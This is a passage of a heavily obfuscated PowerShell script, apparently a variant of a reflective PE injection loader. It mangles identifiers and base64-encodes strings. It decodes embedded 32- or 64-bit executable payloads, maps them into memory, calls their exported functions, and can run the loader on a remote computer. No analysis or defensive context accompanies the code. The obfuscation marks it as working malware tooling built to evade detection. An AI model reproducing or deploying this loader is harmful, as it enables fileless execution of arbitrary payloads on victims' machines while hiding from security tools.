				    ${____/\/\/==\__/=\} = ___/\/\/\/=\/=\/=\ @() ([IntPtr])
				    ${_/\___/=\/\/=\_/=} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${_/\__/=\/\/\/====}, ${____/\/\/==\__/=\})
				    [IntPtr]${_/=\_/=\/\_/==\_/} = ${_/\___/=\/\/=\_/=}.Invoke()
				    ${___/\____/\___/==} = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi(${_/=\_/=\/\_/==\_/})
				    echo ${___/\____/\___/==}
	            }
	            $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VgBvAGkAZAA='))) {
	                Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAGwAbABpAG4AZwAgAGYAdQBuAGMAdABpAG8AbgAgAHcAaQB0AGgAIABWAG8AaQBkACAAcgBlAHQAdQByAG4AIAB0AHkAcABlAA==')))
				    [IntPtr]${___/\__/=\/\_/==\} = __/===\__/\/\__/\/ -__/\/=\_/====\_/=\ ${__/\/=\_/====\_/=\} -_/==\/==\____/==\_ $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VgBvAGkAZABGAHUAbgBjAA==')))
				    if (${___/\__/=\/\_/==\} -eq [IntPtr]::Zero)
				    {
					    Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAHUAbABkAG4AJwB0ACAAZgBpAG4AZAAgAGYAdQBuAGMAdABpAG8AbgAgAGEAZABkAHIAZQBzAHMALgA=')))
				    }
				    ${____/=\___/=\____} = ___/\/\/\/=\/=\/=\ @() ([Void])
				    ${__/\/===\/=\/===\} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${___/\__/=\/\_/==\}, ${____/=\___/=\____})
				    ${__/\/===\/=\/===\}.Invoke() | Out-Null
	            }
	        }
		}
		elseif ((${__/\/==\_/\_/\_/\_}.FileType -ieq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABMAEwA')))) -and (${__/\/=====\/==\___} -ne [IntPtr]::Zero))
		{
			${___/\__/=\/\_/==\} = __/===\__/\/\__/\/ -__/\/=\_/====\_/=\ ${__/\/=\_/====\_/=\} -_/==\/==\____/==\_ $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VgBvAGkAZABGAHUAbgBjAA==')))
			if ((${___/\__/=\/\_/==\} -eq $null) -or (${___/\__/=\/\_/==\} -eq [IntPtr]::Zero))
			{
				Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VgBvAGkAZABGAHUAbgBjACAAYwBvAHUAbABkAG4AJwB0ACAAYgBlACAAZgBvAHUAbgBkACAAaQBuACAAdABoAGUAIABEAEwATAA=')))
			}
			${___/\__/=\/\_/==\} = _/=\_/\/==\/\_/=== ${___/\__/=\/\_/==\} ${__/\/=\_/====\_/=\}
			${___/\__/=\/\_/==\} = ____/\/===\__/\/== ${___/\__/=\/\_/==\} ${_/\/==\___/\_/\/=}
			${/=\_/=\/=\__/\___} = _/==\__/=\/\_____/ -_/==\/=\_/\_/==\__ ${__/\/=====\/==\___} -__/\_/====\_/====\ ${___/\__/=\/\_/==\} -Win32Functions $Win32Functions
		}
		if (${__/\/=====\/==\___} -eq [IntPtr]::Zero -and ${__/\/==\_/\_/\_/\_}.FileType -ieq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABMAEwA'))))
		{
			_/\_____/\/==\__/= -__/\/=\_/====\_/=\ ${__/\/=\_/====\_/=\}
		}
		else
		{
			${__/==\_/======\/=} = $Win32Functions.VirtualFree.Invoke(${__/\/=\_/====\_/=\}, [UInt64]0, $Win32Constants.MEM_RELEASE)
			if (${__/==\_/======\/=} -eq $false)
			{
				Write-Warning $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AIABjAGEAbABsACAAVgBpAHIAdAB1AGEAbABGAHIAZQBlACAAbwBuACAAdABoAGUAIABQAEUAJwBzACAAbQBlAG0AbwByAHkALgAgAEMAbwBuAHQAaQBuAHUAaQBuAGcAIABhAG4AeQB3AGEAeQBzAC4A'))) -WarningAction Continue
			}
		}
		Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG4AZQAhAA==')))
	}
	_/=\__/\__/\_/==\/
}
Function _/=\__/\__/\_/==\/
{
	if (($PSCmdlet.MyInvocation.BoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAGIAdQBnAA==')))] -ne $null) -and $PSCmdlet.MyInvocation.BoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAGIAdQBnAA==')))].IsPresent)
	{
		$DebugPreference  = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG4AdABpAG4AdQBlAA==')))
	}
	Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFMAaABlAGwAbAAgAFAAcgBvAGMAZQBzAHMASQBEADoAIAAkAFAASQBEAA==')))
	${__/\__/\__/=\__/=} = (${__/\/\/\/\/\/\_/\_}[0..1] | % {[Char] $_}) -join ''
    if (${__/\__/\__/=\__/=} -ne 'MZ')
    {
        throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABFACAAaQBzACAAbgBvAHQAIABhACAAdgBhAGwAaQBkACAAUABFACAAZgBpAGwAZQAuAA==')))
    }
	if (-not ${_____/\/\_/\_/==\/}) {
		${__/\/\/\/\/\/\_/\_}[0] = 0
		${__/\/\/\/\/\/\_/\_}[1] = 0
	}
	if (${_/=\__/\/\/=\_/\/\} -ne $null -and ${_/=\__/\/\/=\_/\/\} -ne '')
	{
		${_/=\__/\/\/=\_/\/\} = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGYAbABlAGMAdABpAHYAZQBFAHgAZQAgACQAewBfAC8APQBcAF8AXwAvAFwALwBcAC8APQBcAF8ALwBcAC8AXAB9AA==')))
	}
	else
	{
		${_/=\__/\/\/=\_/\/\} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGYAbABlAGMAdABpAHYAZQBFAHgAZQA=')))
	}
	if (${___/====\/==\/\/\/} -eq $null -or ${___/====\/==\/\/\/} -imatch $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XgBcAHMAKgAkAA=='))))
	{
		icm -ScriptBlock ${/===\__/\_/=\____} -ArgumentList @(${__/\/\/\/\/\/\_/\_}, ${__/=\_/==\/==\/\/\}, ${_______/\/=====\_/}, ${__/==\_/=\/==\_/\_},${___/==\/\/\/\_____})
	}
	else
	{
		icm -ScriptBlock ${/===\__/\_/=\____} -ArgumentList @(${__/\/\/\/\/\/\_/\_}, ${__/=\_/==\/==\/\/\}, ${_______/\/=====\_/}, ${__/==\_/=\/==\_/\_},${___/==\/\/\/\_____}) -ComputerName ${___/====\/==\/\/\/}
	}
}
_/=\__/\__/\_/==\/
}
 if ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -eq 8)
 {
       [Byte[]]${__/\/\/\/\/\/\_/\_} = [Byte[]][Convert]::FromBase64String(${_/===\_/===\/=\/=})
 }
 else
 {
       [Byte[]]${__/\/\/\/\/\/\_/\_} = [Byte[]][Convert]::FromBase64String(${___/=\__/===\__/\})
 }
_/=\/\___/====\_/\ -__/\/\/\/\/\/\_/\_ ${__/\/\/\/\/\/\_/\_} -_/=\__/\/\/=\_/\/\ $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABuAHUAbQBiAGUAcgAgACQAYwBvAG0AbQBhAG4AZAA=')))
 }